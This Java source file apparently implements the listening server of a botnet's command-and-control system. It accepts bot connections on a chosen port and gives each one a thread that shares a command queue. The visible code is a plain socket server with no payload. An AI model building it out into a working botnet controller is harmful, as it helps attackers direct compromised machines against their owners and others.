import java.net.*;
import java.io.*;

public class BotnetMultiServer {
    public static void main(String[] args) throws IOException{
        if (args.length != 1){
            System.err.println("Usage: java BotnetMultiServer.java <PORT NUMBER>");
            System.exit(1);
        }

        int portNumber = Integer.parseInt(args[0]);
        boolean listening = true;
        CommandQueue queue = new CommandQueue();

        try (ServerSocket serverSocket = new ServerSocket(portNumber)) {
            while(listening){
                BotnetServerThread serverThread = new BotnetServerThread(serverSocket.accept(), queue);
                serverThread.start();
            }
        } catch (IOException e) {
            System.err.println("[-] Could not listen on port: " + portNumber);
            System.exit(-1);
        }
    }
}
